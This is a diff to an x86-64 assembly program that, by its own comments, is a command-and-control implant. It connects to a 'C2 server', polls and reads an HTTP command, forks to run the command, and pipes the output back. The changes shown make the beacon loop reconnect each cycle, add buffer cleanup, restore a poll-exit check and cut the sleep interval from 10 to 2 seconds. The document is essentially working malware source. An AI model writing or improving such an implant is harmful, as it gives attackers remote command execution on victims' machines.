@@ -44,6 +44,7 @@ section .text
     global fn_buffer_copy
     global fn_make_pipe
     global fn_buffer_cmp
+    global fn_cleanup
 
 ; Function to exit
 fn_error_exit:
@@ -81,6 +82,28 @@ fn_dbg_print_cmd_buffer:
 
     cmp rax, 0
     jl fn_error_exit            ; exit if an error occurred
+
+    mov rsp, rbp
+    pop rbp
+    ret
+
+; Function that cleans up after each run to make sure the new iteration works
+fn_cleanup:
+    push rbp
+    mov rbp, rsp
+    sub rsp, 0x8                ; Stackframe
+
+    ; Cleanup cmd_buffer and tx_buffer
+    lea rdi, [cmd_buffer]
+    mov rsi, [cmd_buffer_length]
+    call fn_clean_buffer 
+    lea rdi, [tx_buffer]
+    mov rsi, [tx_buffer_length]
+    call fn_clean_buffer
+
+    ; Zero buffer lengths
+    mov qword [cmd_buffer_length], 0x0
+    mov qword [tx_buffer_length], 0x0
 
     mov rsp, rbp
     pop rbp
@@ -229,9 +252,6 @@ fn_exec_cmd:
     mov rbp, rsp
     sub rsp, 0x10               ; Stackframe
 
-    ; Creates the pipe
-    call fn_make_pipe
-
     ; Call fork to split into child and parent processes
     mov rax, 0x39               ; fork syscall
     syscall
@@ -330,7 +350,6 @@ fn_parse_command:
     mov rbp, rsp
     sub rsp, 0x8                ; Stackframe
 
-    call fn_sleep
     ; Trick is to find \r\n\r\n in http command
     ; Iterate through the whole buffer to find that pattern
     xor rax, rax                ; The pattern finder
@@ -415,7 +434,6 @@ fn_poll_socket:
     push rbp
     mov rbp, rsp
     sub rsp, 0x18               ; Stackframe
-
     ; Poll data from fd
     ; Prepare fds argument
     ;
@@ -442,7 +460,7 @@ fn_poll_socket:
 
     movzx rax, word [rsp+6]     ; Load revents
     test ax, 0x1                ; Check if POLLIN is set
-    ;jz .exit                    ; Return if not ready
+    jz .exit                    ; Return if not ready
 
     ; Use ioctl to get number of bytes available
     mov rax, 0x10               ; ioctl syscall
@@ -456,8 +474,8 @@ fn_poll_socket:
     mov rsp, rbp
     pop rbp
     ret
-;.exit
-;    call fn_error_exit
+.exit:
+    call fn_error_exit
 
 ; Function to read the raw data of the C2 server
 ; Reads from the socket file descriptor stored in memory and stores inside rx_buffer
@@ -588,10 +606,13 @@ fn_get_command:
 _start:
     mov rbp, rsp
 
+    ; Creates the child-process pipe
+    call fn_make_pipe
+
+.loop:
     ; Connection to C2 server
     call fn_connect_client
 
-.loop:
     ; Get command from server
     call fn_get_command
 
@@ -610,9 +631,12 @@ _start:
     mov rax, [cmd_buffer_length]        ; Copy buffer length
     mov [cmd_buffer_old_length], rax
 
-    mov qword [sleep_time], 0xa         ; Sleep 10 seconds
+    mov qword [sleep_time], 0x2         ; Sleep 2 seconds
     call fn_sleep
     mov qword [sleep_time], 0x0 
+
+    ; Cleanup buffers
+    call fn_cleanup
     jmp .loop
 
     ; Exit the program
